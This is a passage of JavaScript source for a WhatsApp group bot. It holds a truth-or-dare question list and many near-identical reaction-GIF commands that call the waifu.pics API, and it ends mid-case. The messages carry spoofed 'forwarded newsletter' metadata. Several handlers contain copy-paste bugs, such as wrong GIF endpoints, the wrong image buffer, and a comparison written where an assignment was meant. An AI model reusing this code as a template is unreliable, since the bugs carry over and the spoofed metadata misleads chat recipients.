    "What is the name of your friend's ex-girlfriend that you used to secretly like?",
    "Have you ever stolen money from your father or mom? The reason?",
    "What makes you happy when you're sad?",
    "Ever had a one sided love? if so who? how does it feel bro?", 
    "been someone's mistress?",
    "the most feared thing",
    "Who is the most influential person in your life?",
    "what proud thing did you get this year", 
    "Who is the person who can make you awesome", 
    "Who is the person who has ever made you very happy?", 
    "Who is closest to your ideal type of partner here", 
    "Who do you like to play with??", 
    "Have you ever rejected people? the reason why?",
    "Mention an incident that made you hurt that you still remember", 
    "What achievements have you got this year??",
    "What's your worst habit at school??",
    "What song do you sing most in the shower",
    "Have you ever had a near-death experience",
    "When was the last time you were really angry. Why?",
    "Who is the last person who called you",
    "Do you have any hidden talents, What are they",
    "What word do you hate the most?",
    "What is the last YouTube video you watched?",
    "What is the last thing you Googled",
    "Who in this group would you want to swap lives with for a week",
    "What is the scariest thing thats ever happened to you",
    "Have you ever farted and blamed it on someone else",
    "When is the last time you made someone else cry",
    "Have you ever ghosted a friend",
    "Have you ever seen a dead body",
    "Which of your family members annoys you the most and why",
    "If you had to delete one app from your phone, which one would it be",
    "What app do you waste the most time on",
    "Have you ever faked sick to get home from school",
    "What is the most embarrassing item in your room",
    "What five items would you bring if you got stuck on a desert island",
    "Have you ever laughed so hard you peed your pants",
    "Do you smell your own farts",
    "have u ever peed on the bed while sleeping ??",
    "What is the biggest mistake you have ever made",
    "Have you ever cheated in an exam",
    "What is the worst thing you have ever done",
    "When was the last time you cried",
    "whom do you love the most among ur parents", 
    "do u sometimes put ur finger in ur nosetril?", 
    "who was ur crush during the school days",
    "tell honestly, do u like any boy in this grup",
    "have you ever liked anyone? how long?",
    "do you have gf/bf','what is your biggest fear?",
    "have you ever liked someone and felt that person likes you too?",
    "What is the name of your ex boyfriend of your friend that you once liked quietly?",
    "ever did you steal your mothers money or your fathers money",
    "what makes you happy when you are sad",
    "do you like someone who is in this grup? if you then who?",
    "have you ever been cheated on by people?",
    "who is the most important person in your life",
    "what proud things did you get this year",
    "who is the person who can make you happy when u r sad",
    "who is the person who ever made you feel uncomfortable",
    "have you ever lied to your parents",
    "do you still like ur ex",
    "who do you like to play together with?",
    "have you ever stolen big thing in ur life? the reason why?",
    "Mention the incident that makes you hurt that you still remember",
    "what achievements have you got this year?",
    "what was your worst habit at school?",
    "do you love the bot creator, alya?ðŸ¤£",
    "have you ever thought of taking revenge from ur teacher?",
    "do you like current prime minister of ur country",
    "you non veg or veg",
    "if you could be invisible, what is the first thing you would do",
    "what is a secret you kept from your parents",
    "Who is your secret crush",
    "whois the last person you creeped on social media",
    "If a genie granted you three wishes, what would you ask for",
    "What is your biggest regret",
    "What animal do you think you most look like",
    "How many selfies do you take a day",
    "What was your favorite childhood show",
    "if you could be a fictional character for a day, who would you choose",
    "whom do you text the most",
    "What is the biggest lie you ever told your parents",
    "Who is your celebrity crush",
    "Whats the strangest dream you have ever had",
    "do you play pubg, if you then send ur id number"
]
              const alyatruth = truth[Math.floor(Math.random() * truth.length)]
              buffertruth = await getBuffer(`https://i.ibb.co/305yt26/bf84f20635dedd5dde31e7e5b6983ae9.jpg`)
              let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: '_You choose TRUTH_\n'+ alyatruth
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: bufferdare}, { upload: AlyaBotInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"PLAY AGAIN 🤔\",\"id\":\"${prefix}truth"}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: 'https://whatsapp.com/channel/0029VarnzwcGJP8HhlyFsO09',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await AlyaBotInc.relayMessage(m.chat, msgs.message, {})
}
              break
              case 'hug': {

        if (!m.isGroup) return AlyaStickGroup()
        if (!m.mentionedJid[0] && !m.quoted) return replygcalya(`Tag or reply to a person`)
        var pat = await fetchJson(`https://api.waifu.pics/sfw/hug`)

        try {

          let messsender = m.sender

          let musers = ``
          try {

            users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'

            ment = [messsender, users]

          } catch {

            users == "none"

            ment = [messsender, m.sender]

          }

          if (users == "none") {

           musers = `@${m.sender.split("@")[0]} hugged themself!`

          } else {

           musers = `@${m.sender.split("@")[0]} hugged @${users.split("@")[0]} `

          }

          const response = await axios.get(pat.url, { responseType: 'arraybuffer' })

          const buffer = Buffer.from(response.data, "utf-8")

          var fetchedgif = await GIFBufferToVideoBuffer(buffer)

          AlyaBotInc.sendMessage(m.chat, { video: fetchedgif, gifPlayback: true, mentions: ment, caption: musers }, { quoted: m })

        } catch (error) {

          console.log(error);

        }

      }

        break;
        case 'cry': {

        if (!m.isGroup) return AlyaStickGroup()
        if (!m.mentionedJid[0] && !m.quoted) return replygcalya(`Tag or reply to a person`)
        var pat = await fetchJson(`https://api.waifu.pics/sfw/cry`)

        try {

          let messsender = m.sender

          let musers = ``
          try {

            users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'

            ment = [messsender, users]

          } catch {

            users == "none"

            ment = [messsender, m.sender]

          }

          if (users == "none") {

           musers = `@${m.sender.split("@")[0]} cried themself!`

          } else {

           musers = `@${m.sender.split("@")[0]} cried @${users.split("@")[0]} `

          }

          const response = await axios.get(pat.url, { responseType: 'arraybuffer' })

          const buffer = Buffer.from(response.data, "utf-8")

          var fetchedgif = await GIFBufferToVideoBuffer(buffer)

          AlyaBotInc.sendMessage(m.chat, { video: fetchedgif, gifPlayback: true, mentions: ment, caption: musers }, { quoted: m })

        } catch (error) {

          console.log(error);

        }

      }

        break;
        case 'kill': {

        if (!m.isGroup) return AlyaStickGroup()
        if (!m.mentionedJid[0] && !m.quoted) return replygcalya(`Tag or reply to a person`)
        var pat = await fetchJson(`https://api.waifu.pics/sfw/kill`)

        try {

          let messsender = m.sender

          let musers = ``
          try {

            users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'

            ment = [messsender, users]

          } catch {

            users == "none"

            ment = [messsender, m.sender]

          }

          if (users == "none") {

           musers = `@${m.sender.split("@")[0]} killed themself!`

          } else {

           musers = `@${m.sender.split("@")[0]} killed @${users.split("@")[0]} `

          }

          const response = await axios.get(pat.url, { responseType: 'arraybuffer' })

          const buffer = Buffer.from(response.data, "utf-8")

          var fetchedgif = await GIFBufferToVideoBuffer(buffer)

          AlyaBotInc.sendMessage(m.chat, { video: fetchedgif, gifPlayback: true, mentions: ment, caption: musers }, { quoted: m })

        } catch (error) {

          console.log(error);

        }

      }

        break;
        case 'pat': {

        if (!m.isGroup) return AlyaStickGroup()
        if (!m.mentionedJid[0] && !m.quoted) return replygcalya(`Tag or reply to a person`)
        var pat = await fetchJson(`https://api.waifu.pics/sfw/pat`)

        try {

          let messsender = m.sender

          let musers = ``
          try {

            users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'

            ment = [messsender, users]

          } catch {

            users == "none"

            ment = [messsender, m.sender]

          }

          if (users == "none") {

           musers = `@${m.sender.split("@")[0]} patted themself!`

          } else {

           musers = `@${m.sender.split("@")[0]} patted @${users.split("@")[0]} `

          }

          const response = await axios.get(pat.url, { responseType: 'arraybuffer' })

          const buffer = Buffer.from(response.data, "utf-8")

          var fetchedgif = await GIFBufferToVideoBuffer(buffer)

          AlyaBotInc.sendMessage(m.chat, { video: fetchedgif, gifPlayback: true, mentions: ment, caption: musers }, { quoted: m })

        } catch (error) {

          console.log(error);

        }

      }

        break;
        case 'lick': {

        if (!m.isGroup) return AlyaStickGroup()
        if (!m.mentionedJid[0] && !m.quoted) return replygcalya(`Tag or reply to a person`)
        var pat = await fetchJson(`https://api.waifu.pics/sfw/lick`)

        try {

          let messsender = m.sender

          let musers = ``
          try {

            users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'

            ment = [messsender, users]

          } catch {

            users == "none"

            ment = [messsender, m.sender]

          }

          if (users == "none") {

           musers = `@${m.sender.split("@")[0]} licked themself!`

          } else {

           musers = `@${m.sender.split("@")[0]} licked @${users.split("@")[0]} `

          }

          const response = await axios.get(pat.url, { responseType: 'arraybuffer' })

          const buffer = Buffer.from(response.data, "utf-8")

          var fetchedgif = await GIFBufferToVideoBuffer(buffer)

          AlyaBotInc.sendMessage(m.chat, { video: fetchedgif, gifPlayback: true, mentions: ment, caption: musers }, { quoted: m })

        } catch (error) {

          console.log(error);

        }

      }

        break;
        case 'kiss': {

        if (!m.isGroup) return AlyaStickGroup()
        if (!m.mentionedJid[0] && !m.quoted) return replygcalya(`Tag or reply to a person`)
        var pat = await fetchJson(`https://api.waifu.pics/sfw/kiss`)

        try {

          let messsender = m.sender

          let musers = ``
          try {

            users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'

            ment = [messsender, users]

          } catch {

            users == "none"

            ment = [messsender, m.sender]

          }

          if (users == "none") {

           musers = `@${m.sender.split("@")[0]} kissed themself!`

          } else {

           musers = `@${m.sender.split("@")[0]} kissed @${users.split("@")[0]} `

          }

          const response = await axios.get(pat.url, { responseType: 'arraybuffer' })

          const buffer = Buffer.from(response.data, "utf-8")

          var fetchedgif = await GIFBufferToVideoBuffer(buffer)

          AlyaBotInc.sendMessage(m.chat, { video: fetchedgif, gifPlayback: true, mentions: ment, caption: musers }, { quoted: m })

        } catch (error) {

          console.log(error);

        }

      }

        break;
        case 'bite': {

        if (!m.isGroup) return AlyaStickGroup()
        if (!m.mentionedJid[0] && !m.quoted) return replygcalya(`Tag or reply to a person`)
        var pat = await fetchJson(`https://api.waifu.pics/sfw/cry`)

        try {

          let messsender = m.sender

          let musers = ``
          try {

            users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'

            ment = [messsender, users]

          } catch {

            users == "none"

            ment = [messsender, m.sender]

          }

          if (users == "none") {

           musers = `@${m.sender.split("@")[0]} bit themself!`

          } else {

           musers = `@${m.sender.split("@")[0]} bit @${users.split("@")[0]} `

          }

          const response = await axios.get(pat.url, { responseType: 'arraybuffer' })

          const buffer = Buffer.from(response.data, "utf-8")

          var fetchedgif = await GIFBufferToVideoBuffer(buffer)

          AlyaBotInc.sendMessage(m.chat, { video: fetchedgif, gifPlayback: true, mentions: ment, caption: musers }, { quoted: m })

        } catch (error) {

          console.log(error);

        }

      }

        break;
        case 'yeet': {

        if (!m.isGroup) return AlyaStickGroup()
        if (!m.mentionedJid[0] && !m.quoted) return replygcalya(`Tag or reply to a person`)
        var pat = await fetchJson(`https://api.waifu.pics/sfw/yeet`)

        try {

          let messsender = m.sender

          let musers = ``
          try {

            users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'

            ment = [messsender, users]

          } catch {

            users == "none"

            ment = [messsender, m.sender]

          }

          if (users == "none") {

           musers = `@${m.sender.split("@")[0]} yeeted themself!`

          } else {

           musers = `@${m.sender.split("@")[0]} yeeted @${users.split("@")[0]} `

          }

          const response = await axios.get(pat.url, { responseType: 'arraybuffer' })

          const buffer = Buffer.from(response.data, "utf-8")

          var fetchedgif = await GIFBufferToVideoBuffer(buffer)

          AlyaBotInc.sendMessage(m.chat, { video: fetchedgif, gifPlayback: true, mentions: ment, caption: musers }, { quoted: m })

        } catch (error) {

          console.log(error);

        }

      }

        break;
        case 'bully': {

        if (!m.isGroup) return AlyaStickGroup()
        if (!m.mentionedJid[0] && !m.quoted) return replygcalya(`Tag or reply to a person`)
        var pat = await fetchJson(`https://api.waifu.pics/sfw/bully`)

        try {

          let messsender = m.sender

          let musers = ``
          try {

            users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'

            ment = [messsender, users]

          } catch {

            users == "none"

            ment = [messsender, m.sender]

          }

          if (users == "none") {

           musers = `@${m.sender.split("@")[0]} bullied themself!`

          } else {

           musers = `@${m.sender.split("@")[0]} bullied @${users.split("@")[0]} `

          }

          const response = await axios.get(pat.url, { responseType: 'arraybuffer' })

          const buffer = Buffer.from(response.data, "utf-8")

          var fetchedgif = await GIFBufferToVideoBuffer(buffer)

          AlyaBotInc.sendMessage(m.chat, { video: fetchedgif, gifPlayback: true, mentions: ment, caption: musers }, { quoted: m })

        } catch (error) {

          console.log(error);

        }

      }

        break;
        case 'bonk': {

        if (!m.isGroup) return AlyaStickGroup()
        if (!m.mentionedJid[0] && !m.quoted) return replygcalya(`Tag or reply to a person`)
        var pat = await fetchJson(`https://api.waifu.pics/sfw/bonk`)

        try {

          let messsender = m.sender

          let musers = ``
          try {

            users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'

            ment = [messsender, users]

          } catch {

            users == "none"

            ment = [messsender, m.sender]

          }

          if (users == "none") {

           musers = `@${m.sender.split("@")[0]} bonked themself!`

          } else {

           musers = `@${m.sender.split("@")[0]} bonked @${users.split("@")[0]} `

          }

          const response = await axios.get(pat.url, { responseType: 'arraybuffer' })

          const buffer = Buffer.from(response.data, "utf-8")

          var fetchedgif = await GIFBufferToVideoBuffer(buffer)

          AlyaBotInc.sendMessage(m.chat, { video: fetchedgif, gifPlayback: true, mentions: ment, caption: musers }, { quoted: m })

        } catch (error) {

          console.log(error);

        }

      }

        break;
        case 'wink': {

        if (!m.isGroup) return AlyaStickGroup()
        if (!m.mentionedJid[0] && !m.quoted) return replygcalya(`Tag or reply to a person`)
        var pat = await fetchJson(`https://api.waifu.pics/sfw/wink`)

        try {

          let messsender = m.sender

          let musers = ``
          try {

            users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'

            ment = [messsender, users]

          } catch {

            users == "none"

            ment = [messsender, m.sender]

          }

          if (users == "none") {

           musers = `@${m.sender.split("@")[0]} winked themself!`

          } else {

           musers = `@${m.sender.split("@")[0]} winked @${users.split("@")[0]} `

          }

          const response = await axios.get(pat.url, { responseType: 'arraybuffer' })

          const buffer = Buffer.from(response.data, "utf-8")

          var fetchedgif = await GIFBufferToVideoBuffer(buffer)

          AlyaBotInc.sendMessage(m.chat, { video: fetchedgif, gifPlayback: true, mentions: ment, caption: musers }, { quoted: m })

        } catch (error) {

          console.log(error);

        }

      }

        break;
        case 'poke': {

        if (!m.isGroup) return AlyaStickGroup()
        if (!m.mentionedJid[0] && !m.quoted) return replygcalya(`Tag or reply to a person`)
        var pat = await fetchJson(`https://api.waifu.pics/sfw/poke`)

        try {

          let messsender = m.sender

          let musers = ``
          try {

            users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'

            ment = [messsender, users]

          } catch {

            users == "none"

            ment = [messsender, m.sender]

          }

          if (users == "none") {

           musers = `@${m.sender.split("@")[0]} poked themself!`

          } else {

           musers = `@${m.sender.split("@")[0]} poked @${users.split("@")[0]} `

          }

          const response = await axios.get(pat.url, { responseType: 'arraybuffer' })

          const buffer = Buffer.from(response.data, "utf-8")

          var fetchedgif = await GIFBufferToVideoBuffer(buffer)

          AlyaBotInc.sendMessage(m.chat, { video: fetchedgif, gifPlayback: true, mentions: ment, caption: musers }, { quoted: m })

        } catch (error) {

          console.log(error);

        }

      }

        break;
        case 'nom': {

        if (!m.isGroup) return AlyaStickGroup()
        if (!m.mentionedJid[0] && !m.quoted) return replygcalya(`Tag or reply to a person`)
        var pat = await fetchJson(`https://api.waifu.pics/sfw/nom`)

        try {

          let messsender = m.sender

          let musers = ``
          try {

            users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'

            ment = [messsender, users]

          } catch {

            users == "none"

            ment = [messsender, m.sender]

          }

          if (users == "none") {

           musers = `@${m.sender.split("@")[0]} nommed themself!`

          } else {

           musers = `@${m.sender.split("@")[0]} nommed @${users.split("@")[0]} `

          }

          const response = await axios.get(pat.url, { responseType: 'arraybuffer' })

          const buffer = Buffer.from(response.data, "utf-8")

          var fetchedgif = await GIFBufferToVideoBuffer(buffer)

          AlyaBotInc.sendMessage(m.chat, { video: fetchedgif, gifPlayback: true, mentions: ment, caption: musers }, { quoted: m })

        } catch (error) {

          console.log(error);

        }

      }

        break;
        case 'slap': {

        if (!m.isGroup) return AlyaStickGroup()
        if (!m.mentionedJid[0] && !m.quoted) return replygcalya(`Tag or reply to a person`)
        var pat = await fetchJson(`https://api.waifu.pics/sfw/slap`)

        try {

          let messsender = m.sender

          let musers = ``
          try {

            users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'

            ment = [messsender, users]

          } catch {

            users == "none"

            ment = [messsender, m.sender]

          }

          if (users == "none") {

           musers = `@${m.sender.split("@")[0]} slapped themself!`

          } else {

           musers = `@${m.sender.split("@")[0]} slapped @${users.split("@")[0]} `

          }

          const response = await axios.get(pat.url, { responseType: 'arraybuffer' })

          const buffer = Buffer.from(response.data, "utf-8")

          var fetchedgif = await GIFBufferToVideoBuffer(buffer)

          AlyaBotInc.sendMessage(m.chat, { video: fetchedgif, gifPlayback: true, mentions: ment, caption: musers }, { quoted: m })

        } catch (error) {

          console.log(error);

        }

      }

        break;
        case 'smile': {

        if (!m.isGroup) return AlyaStickGroup()
        if (!m.mentionedJid[0] && !m.quoted) return replygcalya(`Tag or reply to a person`)
        var pat = await fetchJson(`https://api.waifu.pics/sfw/smile`)

        try {

          let messsender = m.sender

          let musers = ``
          try {

            users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'

            ment = [messsender, users]

          } catch {

            users == "none"

            ment = [messsender, m.sender]

          }

          if (users == "none") {

           musers = `@${m.sender.split("@")[0]} smiled themself!`

          } else {

           musers = `@${m.sender.split("@")[0]} smiled @${users.split("@")[0]} `

          }

          const response = await axios.get(pat.url, { responseType: 'arraybuffer' })

          const buffer = Buffer.from(response.data, "utf-8")

          var fetchedgif = await GIFBufferToVideoBuffer(buffer)

          AlyaBotInc.sendMessage(m.chat, { video: fetchedgif, gifPlayback: true, mentions: ment, caption: musers }, { quoted: m })

        } catch (error) {

          console.log(error);

        }

      }

        break;
        case 'wave': {

        if (!m.isGroup) return AlyaStickGroup()
        if (!m.mentionedJid[0] && !m.quoted) return replygcalya(`Tag or reply to a person`)
        var pat = await fetchJson(`https://api.waifu.pics/sfw/wave`)

        try {

          let messsender = m.sender

          let musers = ``
          try {

            users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'

            ment = [messsender, users]

          } catch {

            users == "none"

            ment = [messsender, m.sender]

          }

          if (users == "none") {

           musers = `@${m.sender.split("@")[0]} waved themself!`

          } else {

           musers = `@${m.sender.split("@")[0]} waved @${users.split("@")[0]} `

          }

          const response = await axios.get(pat.url, { responseType: 'arraybuffer' })

          const buffer = Buffer.from(response.data, "utf-8")

          var fetchedgif = await GIFBufferToVideoBuffer(buffer)

          AlyaBotInc.sendMessage(m.chat, { video: fetchedgif, gifPlayback: true, mentions: ment, caption: musers }, { quoted: m })

        } catch (error) {

          console.log(error);

        }

      }

        break;
        case 'awoo': {

        if (!m.isGroup) return AlyaStickGroup()
        if (!m.mentionedJid[0] && !m.quoted) return replygcalya(`Tag or reply to a person`)
        var pat = await fetchJson(`https://api.waifu.pics/sfw/awoo`)

        try {

          let messsender = m.sender

          let musers = ``
          try {

            users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'

            ment = [messsender, users]

          } catch {

            users == "none"

            ment = [messsender, m.sender]

          }

          if (users == "none") {

           musers = `@${m.sender.split("@")[0]} awooed themself!`

          } else {

           musers = `@${m.sender.split("@")[0]} awooed @${users.split("@")[0]} `

          }

          const response = await axios.get(pat.url, { responseType: 'arraybuffer' })

          const buffer = Buffer.from(response.data, "utf-8")

          var fetchedgif = await GIFBufferToVideoBuffer(buffer)

          AlyaBotInc.sendMessage(m.chat, { video: fetchedgif, gifPlayback: true, mentions: ment, caption: musers }, { quoted: m })

        } catch (error) {

          console.log(error);

        }

      }

        break;
        case 'blush': {

        if (!m.isGroup) return AlyaStickGroup()
        if (!m.mentionedJid[0] && !m.quoted) return replygcalya(`Tag or reply to a person`)
        var pat = await fetchJson(`https://api.waifu.pics/sfw/blush`)

        try {

          let messsender = m.sender

          let musers = ``
          try {

            users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'

            ment = [messsender, users]

          } catch {

            users == "none"

            ment = [messsender, m.sender]

          }

          if (users == "none") {

           musers = `@${m.sender.split("@")[0]} blushed themself!`

          } else {

           musers = `@${m.sender.split("@")[0]} blushed @${users.split("@")[0]} `

          }

          const response = await axios.get(pat.url, { responseType: 'arraybuffer' })

          const buffer = Buffer.from(response.data, "utf-8")

          var fetchedgif = await GIFBufferToVideoBuffer(buffer)

          AlyaBotInc.sendMessage(m.chat, { video: fetchedgif, gifPlayback: true, mentions: ment, caption: musers }, { quoted: m })

        } catch (error) {

          console.log(error);

        }

      }

        break;
        case 'smug': {

        if (!m.isGroup) return AlyaStickGroup()
        if (!m.mentionedJid[0] && !m.quoted) return replygcalya(`Tag or reply to a person`)
        var pat = await fetchJson(`https://api.waifu.pics/sfw/smug`)

        try {

          let messsender = m.sender

          let musers = ``
          try {

            users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'

            ment = [messsender, users]

          } catch {

            users == "none"

            ment = [messsender, m.sender]

          }

          if (users == "none") {

           musers = `@${m.sender.split("@")[0]} smugged themself!`

          } else {

           musers = `@${m.sender.split("@")[0]} smugged @${users.split("@")[0]} `

          }

          const response = await axios.get(pat.url, { responseType: 'arraybuffer' })

          const buffer = Buffer.from(response.data, "utf-8")

          var fetchedgif = await GIFBufferToVideoBuffer(buffer)

          AlyaBotInc.sendMessage(m.chat, { video: fetchedgif, gifPlayback: true, mentions: ment, caption: musers }, { quoted: m })

        } catch (error) {

          console.log(error);

        }

      }

        break;
        case 'glomp': {

        if (!m.isGroup) return AlyaStickGroup()
        if (!m.mentionedJid[0] && !m.quoted) return replygcalya(`Tag or reply to a person`)
        var pat = await fetchJson(`https://api.waifu.pics/sfw/glomp`)

        try {

          let messsender = m.sender

          let musers = ``
          try {

            users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'

            ment = [messsender, users]

          } catch {

            users == "none"

            ment = [messsender, m.sender]

          }

          if (users == "none") {

           musers = `@${m.sender.split("@")[0]} glomped themself!`

          } else {

           musers = `@${m.sender.split("@")[0]} glomped @${users.split("@")[0]} `

          }

          const response = await axios.get(pat.url, { responseType: 'arraybuffer' })

          const buffer = Buffer.from(response.data, "utf-8")

          var fetchedgif = await GIFBufferToVideoBuffer(buffer)

          AlyaBotInc.sendMessage(m.chat, { video: fetchedgif, gifPlayback: true, mentions: ment, caption: musers }, { quoted: m })

        } catch (error) {

          console.log(error);

        }

      }

        break;
        case 'happy': {

        if (!m.isGroup) return AlyaStickGroup()
        if (!m.mentionedJid[0] && !m.quoted) return replygcalya(`Tag or reply to a person`)
        var pat = await fetchJson(`https://api.waifu.pics/sfw/happy`)

        try {

          let messsender = m.sender

          let musers = ``
          try {

            users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'

            ment = [messsender, users]

          } catch {

            users == "none"

            ment = [messsender, m.sender]

          }

          if (users == "none") {

           musers = `@${m.sender.split("@")[0]} happied themself!`

          } else {

           musers = `@${m.sender.split("@")[0]} happied @${users.split("@")[0]} `

          }

          const response = await axios.get(pat.url, { responseType: 'arraybuffer' })

          const buffer = Buffer.from(response.data, "utf-8")

          var fetchedgif = await GIFBufferToVideoBuffer(buffer)

          AlyaBotInc.sendMessage(m.chat, { video: fetchedgif, gifPlayback: true, mentions: ment, caption: musers }, { quoted: m })

        } catch (error) {

          console.log(error);

        }

      }

        break;
        case 'dance': {

        if (!m.isGroup) return AlyaStickGroup()
        if (!m.mentionedJid[0] && !m.quoted) return replygcalya(`Tag or reply to a person`)
        var pat = await fetchJson(`https://api.waifu.pics/sfw/dance`)

        try {

          let messsender = m.sender

          let musers = ``
          try {

            users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'

            ment = [messsender, users]

          } catch {

            users == "none"

            ment = [messsender, m.sender]

          }

          if (users == "none") {

           musers = `@${m.sender.split("@")[0]} danced themself!`

          } else {

           musers = `@${m.sender.split("@")[0]} danced @${users.split("@")[0]} `

          }

          const response = await axios.get(pat.url, { responseType: 'arraybuffer' })

          const buffer = Buffer.from(response.data, "utf-8")

          var fetchedgif = await GIFBufferToVideoBuffer(buffer)

          AlyaBotInc.sendMessage(m.chat, { video: fetchedgif, gifPlayback: true, mentions: ment, caption: musers }, { quoted: m })

        } catch (error) {

          console.log(error);

        }

      }

        break;
        case 'cringe': {

        if (!m.isGroup) return AlyaStickGroup()
        if (!m.mentionedJid[0] && !m.quoted) return replygcalya(`Tag or reply to a person`)
        var pat = await fetchJson(`https://api.waifu.pics/sfw/cringe`)

        try {

          let messsender = m.sender

          let musers = ``
          try {

            users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'

            ment = [messsender, users]

          } catch {

            users == "none"

            ment = [messsender, m.sender]

          }

          if (users == "none") {

           musers = `@${m.sender.split("@")[0]} cringed themself!`

          } else {

           musers = `@${m.sender.split("@")[0]} cringed @${users.split("@")[0]} `

          }

          const response = await axios.get(pat.url, { responseType: 'arraybuffer' })

          const buffer = Buffer.from(response.data, "utf-8")

          var fetchedgif = await GIFBufferToVideoBuffer(buffer)

          AlyaBotInc.sendMessage(m.chat, { video: fetchedgif, gifPlayback: true, mentions: ment, caption: musers }, { quoted: m })

        } catch (error) {

          console.log(error);

        }

      }

        break;
        case 'cuddle': {

        if (!m.isGroup) return AlyaStickGroup()
        if (!m.mentionedJid[0] && !m.quoted) return replygcalya(`Tag or reply to a person`)
        var pat = await fetchJson(`https://api.waifu.pics/sfw/cuddle`)

        try {

          let messsender = m.sender

          let musers = ``
          try {

            users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'

            ment = [messsender, users]

          } catch {

            users == "none"

            ment = [messsender, m.sender]

          }

          if (users == "none") {

           musers = `@${m.sender.split("@")[0]} cuddled themself!`

          } else {

           musers = `@${m.sender.split("@")[0]} cuddled @${users.split("@")[0]} `

          }

          const response = await axios.get(pat.url, { responseType: 'arraybuffer' })

          const buffer = Buffer.from(response.data, "utf-8")

          var fetchedgif = await GIFBufferToVideoBuffer(buffer)

          AlyaBotInc.sendMessage(m.chat, { video: fetchedgif, gifPlayback: true, mentions: ment, caption: musers }, { quoted: m })

        } catch (error) {

          console.log(error);

        }

      }

        break;
        case 'highfive': {

        if (!m.isGroup) return AlyaStickGroup()
        if (!m.mentionedJid[0] && !m.quoted) return replygcalya(`Tag or reply to a person`)
        var pat = await fetchJson(`https://api.waifu.pics/sfw/awoo`)

        try {

          let messsender = m.sender

          let musers = ``
          try {

            users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'

            ment = [messsender, users]

          } catch {

            users == "none"

            ment = [messsender, m.sender]

          }

          if (users == "none") {

           musers = `@${m.sender.split("@")[0]} highfived themself!`

          } else {

           musers = `@${m.sender.split("@")[0]} highfived @${users.split("@")[0]} `

          }

          const response = await axios.get(pat.url, { responseType: 'arraybuffer' })

          const buffer = Buffer.from(response.data, "utf-8")

          var fetchedgif = await GIFBufferToVideoBuffer(buffer)

          AlyaBotInc.sendMessage(m.chat, { video: fetchedgif, gifPlayback: true, mentions: ment, caption: musers }, { quoted: m })

        } catch (error) {

          console.log(error);

        }

      }

        break;
        case 'handhold': {

        if (!m.isGroup) return AlyaStickGroup()
